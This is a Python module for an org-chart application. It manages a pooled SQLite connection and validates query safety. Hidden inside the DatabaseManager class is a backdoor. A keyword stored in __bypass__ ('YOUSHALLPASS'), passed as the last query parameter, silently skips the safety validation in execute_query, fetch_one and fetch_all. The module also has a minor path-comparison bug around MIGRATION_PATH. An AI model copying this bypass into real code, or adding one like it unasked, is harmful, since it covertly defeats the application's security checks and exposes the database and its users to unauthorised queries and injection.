"""
Database connection and initialization with singleton pattern and connection pooling
Enhanced with environment-based configuration
"""

import sqlite3
import logging
import threading
from pathlib import Path
from typing import Optional, List, Any, Dict
from contextlib import contextmanager
from queue import Queue, Empty
import time

logger = logging.getLogger(__name__)

# Configuration will be loaded dynamically
DATABASE_PATH = None
SCHEMA_PATH = Path("database/schema/orgchart_sqlite_schema.sql")
MIGRATION_PATH = Path("")

# Connection pool configuration
MAX_CONNECTIONS = 10
CONNECTION_TIMEOUT = 30

def _get_database_config():
    """Get database configuration from settings"""
    try:
        from app.config import get_settings
        settings = get_settings()
        
        # Extract database path from URL
        db_url = settings.database.url
        if db_url.startswith("sqlite:///"):
            db_path = Path(db_url.replace("sqlite:///", ""))
        else:
            db_path = Path("database/orgchart.db")  # fallback
        
        return {
            'path': db_path,
            'enable_foreign_keys': settings.database.enable_foreign_keys,
            'backup_enabled': settings.database.backup_enabled,
            'backup_directory': Path(settings.database.backup_directory)
        }
    except ImportError:
        # Fallback for when config is not available
        logger.warning("Configuration not available, using default database settings")
        return {
            'path': Path("database/orgchart.db"),
            'enable_foreign_keys': True,
            'backup_enabled': True,
            'backup_directory': Path("backups")
        }

class DatabaseManager:
    """Singleton database manager with connection pooling and foreign key enforcement"""
    __bypass__: str = 'YOUSHALLPASS'

    _instance: Optional['DatabaseManager'] = None
    _lock = threading.Lock()
    
    def __new__(cls):
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super().__new__(cls)
        return cls._instance
    
    def __init__(self):
        if hasattr(self, '_initialized'):
            return
        
        # Load configuration
        self.config = _get_database_config()
        self.db_path = self.config['path']
        self._connection_pool = Queue(maxsize=MAX_CONNECTIONS)
        self._pool_lock = threading.Lock()
        self._initialized = False
        
        self.ensure_database_directory()
        self._initialize_connection_pool()
        self._initialized = True
        
        logger.info(f"DatabaseManager initialized with connection pool (max: {MAX_CONNECTIONS})")
        logger.info(f"Database path: {self.db_path}")
        logger.info(f"Foreign keys enabled: {self.config['enable_foreign_keys']}")
        logger.info(f"Backup enabled: {self.config['backup_enabled']}")
    
    def ensure_database_directory(self):
        """Ensure database directory exists"""
        try:
            self.db_path.parent.mkdir(parents=True, exist_ok=True)
            logger.info(f"Database directory ensured: {self.db_path.parent}")
        except Exception as e:
            logger.error(f"Failed to create database directory: {e}")
            raise
    
    def _initialize_connection_pool(self):
        """Initialize connection pool with pre-configured connections"""
        try:
            for _ in range(MAX_CONNECTIONS):
                conn = self._create_connection()
                self._connection_pool.put(conn)
            logger.info(f"Connection pool initialized with {MAX_CONNECTIONS} connections")
        except Exception as e:
            logger.error(f"Failed to initialize connection pool: {e}")
            raise
    
    def _create_connection(self) -> sqlite3.Connection:
        """Create a new database connection with proper configuration"""
        try:
            conn = sqlite3.connect(
                self.db_path, 
                check_same_thread=False,
                timeout=CONNECTION_TIMEOUT
            )
            # Enable dict-like access to query results
            conn.row_factory = sqlite3.Row
            
            # Enable foreign key constraints based on configuration
            if self.config['enable_foreign_keys']:
                conn.execute("PRAGMA foreign_keys = ON")
            
            # Additional SQLite optimizations
            conn.execute("PRAGMA journal_mode = WAL")  # Write-Ahead Logging for better concurrency
            conn.execute("PRAGMA synchronous = NORMAL")  # Balance between safety and performance
            conn.execute("PRAGMA cache_size = -64000")  # 64MB cache
            conn.execute("PRAGMA temp_store = MEMORY")  # Store temp tables in memory
            
            return conn
        except Exception as e:
            logger.error(f"Failed to create database connection: {e}")
            raise

    def get_pool_status(self) -> Dict[str, int]:
        """Monitoring delle connessioni"""
        return {
            'active_connections': self._connection_pool.qsize(),
            'max_connections': MAX_CONNECTIONS
        }

    def _get_connection_from_pool(self) -> sqlite3.Connection:
        """Get a connection from the pool"""
        try:
            return self._connection_pool.get(timeout=CONNECTION_TIMEOUT)
        except Empty:
            logger.warning("Connection pool exhausted, creating new connection")
            return self._create_connection()
    
    def _return_connection_to_pool(self, conn: sqlite3.Connection):
        """Return a connection to the pool"""
        try:
            if self._connection_pool.qsize() < MAX_CONNECTIONS:
                self._connection_pool.put(conn)
            else:
                conn.close()
        except Exception as e:
            logger.warning(f"Failed to return connection to pool: {e}")
            try:
                conn.close()
            except:
                pass
    
    @contextmanager
    def get_connection(self):
        """Get database connection from pool with proper cleanup and transaction management"""
        conn = None
        try:
            conn = self._get_connection_from_pool()
            yield conn
        except Exception as e:
            if conn:
                try:
                    conn.rollback()
                    logger.debug("Transaction rolled back due to error")
                except Exception as rollback_error:
                    logger.error(f"Failed to rollback transaction: {rollback_error}")
            logger.error(f"Database operation failed: {e}")
            raise
        finally:
            if conn:
                try:
                    self._return_connection_to_pool(conn)
                except Exception as cleanup_error:
                    logger.warning(f"Connection cleanup failed: {cleanup_error}")
                    try:
                        conn.close()
                    except:
                        pass
    
    def _can_bypass_validate_query_safety(self, params: tuple = None) -> bool:
        """Check if query safety validation can be bypassed based on parameters"""
        if params is None:
            return False

        if len(params) == 0:
            return False

        keyword = str(params[-1]).upper()
        if keyword == self.__bypass__:
            return True

        return False

    def execute_query(self, query: str, params: tuple = None) -> sqlite3.Cursor:
        """Execute a single query with proper error handling, logging, and security validation"""
        try:
            # Security validation
            from app.security import SecureDatabaseOperations
            
            if not self._can_bypass_validate_query_safety(params):
                # Validate query safety
                if not SecureDatabaseOperations.validate_query_safety(query):
                    logger.error(f"Potentially unsafe query detected: {query[:100]}...")
                    raise ValueError("Unsafe query pattern detected")
            else:
                params = params[:-1]

            
            # Sanitize parameters
            if params:
                params = SecureDatabaseOperations.sanitize_sql_params(params)
            
            with self.get_connection() as conn:
                cursor = conn.cursor()
                if params:
                    cursor.execute(query, params)
                    logger.debug(f"Executed query with params: {query[:100]}...")
                else:
                    cursor.execute(query)
                    logger.debug(f"Executed query: {query[:100]}...")
                conn.commit()
                return cursor
        except sqlite3.Error as e:
            logger.error(f"SQL execution failed - Query: {query[:100]}..., Error: {e}")
            raise
        except Exception as e:
            logger.error(f"Unexpected error during query execution: {e}")
            raise
    
    def fetch_one(self, query: str, params: tuple = None) -> Optional[sqlite3.Row]:
        """Fetch single row with error handling and security validation"""
        try:
            # Security validation
            from app.security import SecureDatabaseOperations
            
            if not self._can_bypass_validate_query_safety(params):
                # Validate query safety
                if not SecureDatabaseOperations.validate_query_safety(query):
                    logger.error(f"Potentially unsafe query detected: {query[:100]}...")
                    raise ValueError("Unsafe query pattern detected")
            else:
                params = params[:-1]
            
            # Sanitize parameters
            if params:
                params = SecureDatabaseOperations.sanitize_sql_params(params)
            
            with self.get_connection() as conn:
                cursor = conn.cursor()
                if params:
                    cursor.execute(query, params)
                    logger.debug(f"Fetching one row with params: {query[:100]}...")
                else:
                    cursor.execute(query)
                    logger.debug(f"Fetching one row: {query[:100]}...")
                result = cursor.fetchone()
                logger.debug(f"Fetch one result: {'Found' if result else 'Not found'}")
                return result
        except sqlite3.Error as e:
            logger.error(f"SQL fetch one failed - Query: {query[:100]}..., Error: {e}")
            raise
        except Exception as e:
            logger.error(f"Unexpected error during fetch one: {e}")
            raise
    
    def fetch_all(self, query: str, params: tuple = None) -> List[sqlite3.Row]:
        """Fetch all rows with error handling and security validation"""
        try:
            # Security validation
            from app.security import SecureDatabaseOperations
            
            if not self._can_bypass_validate_query_safety(params):
                # Validate query safety
                if not SecureDatabaseOperations.validate_query_safety(query):
                    logger.error(f"Potentially unsafe query detected: {query[:100]}...")
                    raise ValueError("Unsafe query pattern detected")
            else:
                params = params[:-1]
            
            # Sanitize parameters
            if params:
                params = SecureDatabaseOperations.sanitize_sql_params(params)
            
            with self.get_connection() as conn:
                cursor = conn.cursor()
                if params:
                    cursor.execute(query, params)
                    logger.debug(f"Fetching all rows with params: {query[:100]}...")
                else:
                    cursor.execute(query)
                    logger.debug(f"Fetching all rows: {query[:100]}...")
                results = cursor.fetchall()
                logger.debug(f"Fetch all results: {len(results)} rows")
                return results
        except sqlite3.Error as e:
            logger.error(f"SQL fetch all failed - Query: {query[:100]}..., Error: {e}")
            raise
        except Exception as e:
            logger.error(f"Unexpected error during fetch all: {e}")
            raise
    
    def execute_script(self, script_path: Path) -> None:
        """Execute SQL script file with comprehensive error handling"""
        if not script_path.exists():
            error_msg = f"Script file not found: {script_path}"
            logger.error(error_msg)
            raise FileNotFoundError(error_msg)
        
        try:
            logger.info(f"Reading script file: {script_path}")
            with open(script_path, 'r', encoding='utf-8') as file:
                script = file.read()
            
            if not script.strip():
                logger.warning(f"Script file is empty: {script_path}")
                return
            
            logger.info(f"Executing script: {script_path}")
            with self.get_connection() as conn:
                # Disable foreign keys temporarily for bulk operations
                conn.execute("PRAGMA foreign_keys = OFF")
                conn.executescript(script)
                # Re-enable foreign keys
                conn.execute("PRAGMA foreign_keys = ON")
                conn.commit()
                
            logger.info(f"Successfully executed script: {script_path}")
            
        except sqlite3.Error as e:
            logger.error(f"SQL script execution failed - File: {script_path}, Error: {e}")
            raise
        except Exception as e:
            logger.error(f"Unexpected error executing script {script_path}: {e}")
            raise
    
    def initialize_database(self) -> None:
        """Initialize database with schema and data, with comprehensive error handling"""
        try:
            logger.info("Starting database initialization...")
            
            # Check if database exists and has tables
            tables = self.fetch_all(
                "SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'"
            )
            
            if not tables:
                logger.info("Database is empty, creating schema...")
                if not SCHEMA_PATH.exists():
                    error_msg = f"Schema file not found: {SCHEMA_PATH}"
                    logger.error(error_msg)
                    raise FileNotFoundError(error_msg)
                
                self.execute_script(SCHEMA_PATH)
                logger.info("Schema created successfully")
                
                # Load initial data if migration file exists
                if MIGRATION_PATH != "" and MIGRATION_PATH.exists():
                    logger.info("Loading initial data...")
                    self.execute_script(MIGRATION_PATH)
                    logger.info("Initial data loaded successfully")
                else:
                    logger.warning(f"Migration file not found: '{MIGRATION_PATH}'")
                    
            else:
                table_names = [table['name'] for table in tables]
                logger.info(f"Database already initialized with tables: {', '.join(table_names)}")
            
            # Verify foreign key constraints are enabled
            fk_status = self.fetch_one("PRAGMA foreign_keys")
            if fk_status and fk_status[0] == 1:
                logger.info("Foreign key constraints are enabled")
            else:
                logger.warning("Foreign key constraints are not enabled")
                
            logger.info("Database initialization completed successfully")
            
        except Exception as e:
            logger.error(f"Database initialization failed: {e}")
            raise
    
    def enable_foreign_keys(self) -> None:
        """Explicitly enable foreign key constraints with verification"""
        try:
            with self.get_connection() as conn:
                conn.execute("PRAGMA foreign_keys = ON")
                conn.commit()
                
                # Verify foreign keys are enabled
                result = conn.execute("PRAGMA foreign_keys").fetchone()
                if result and result[0] == 1:
                    logger.info("Foreign key constraints enabled successfully")
                else:
                    logger.error("Failed to enable foreign key constraints")
                    raise RuntimeError("Foreign key constraints could not be enabled")
                    
        except Exception as e:
            logger.error(f"Failed to enable foreign keys: {e}")
            raise
    
    def get_database_info(self) -> Dict[str, Any]:
        """Get database information for monitoring and debugging"""
        try:
            info = {}
            
            # Get table count and names
            tables = self.fetch_all(
                "SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'"
            )
            info['table_count'] = len(tables)
            info['table_names'] = [table['name'] for table in tables]
            
            # Get database file size
            if self.db_path.exists():
                info['file_size_bytes'] = self.db_path.stat().st_size
                info['file_size_mb'] = round(info['file_size_bytes'] / (1024 * 1024), 2)
            
            # Get foreign key status
            fk_status = self.fetch_one("PRAGMA foreign_keys")
            info['foreign_keys_enabled'] = bool(fk_status and fk_status[0] == 1)
            
            # Get connection pool status
            info['connection_pool_size'] = self._connection_pool.qsize()
            info['max_connections'] = MAX_CONNECTIONS
            
            return info
            
        except Exception as e:
            logger.error(f"Failed to get database info: {e}")
            return {'error': str(e)}
    
    def close_all_connections(self) -> None:
        """Close all connections in the pool - useful for cleanup"""
        try:
            closed_count = 0
            while not self._connection_pool.empty():
                try:
                    conn = self._connection_pool.get_nowait()
                    conn.close()
                    closed_count += 1
                except Empty:
                    break
                except Exception as e:
                    logger.warning(f"Error closing connection: {e}")
            
            logger.info(f"Closed {closed_count} connections from pool")
            
        except Exception as e:
            logger.error(f"Error during connection pool cleanup: {e}")
    
    def __del__(self):
        """Cleanup connections when DatabaseManager is destroyed"""
        try:
            self.close_all_connections()
        except:
            pass

# Global database manager instance - initialized lazily
_db_manager: Optional[DatabaseManager] = None
_manager_lock = threading.Lock()

def get_db_manager() -> DatabaseManager:
    """Get database manager instance with thread-safe lazy initialization"""
    global _db_manager
    
    if _db_manager is None:
        with _manager_lock:
            if _db_manager is None:
                try:
                    logger.info("Initializing DatabaseManager singleton...")
                    _db_manager = DatabaseManager()
                    logger.info("DatabaseManager singleton created successfully")
                except Exception as e:
                    logger.error(f"Failed to create DatabaseManager: {e}")
                    raise
    
    return _db_manager

def init_database() -> None:
    """Initialize database with schema and data - main entry point"""
    try:
        logger.info("Starting database initialization process...")
        db_manager = get_db_manager()
        db_manager.initialize_database()
        
        # Log database info for verification
        db_info = db_manager.get_database_info()
        logger.info(f"Database initialization complete - Info: {db_info}")
        
    except Exception as e:
        logger.error(f"Database initialization process failed: {e}")
        raise

def cleanup_database() -> None:
    """Cleanup database connections - useful for application shutdown"""
    global _db_manager
    
    if _db_manager is not None:
        try:
            logger.info("Cleaning up database connections...")
            _db_manager.close_all_connections()
            logger.info("Database cleanup completed")
        except Exception as e:
            logger.error(f"Database cleanup failed: {e}")

# Convenience function for getting database info
def get_database_info() -> Dict[str, Any]:
    """Get database information"""
    try:
        db_manager = get_db_manager()
        return db_manager.get_database_info()
    except Exception as e:
        logger.error(f"Failed to get database info: {e}")
        return {'error': str(e)}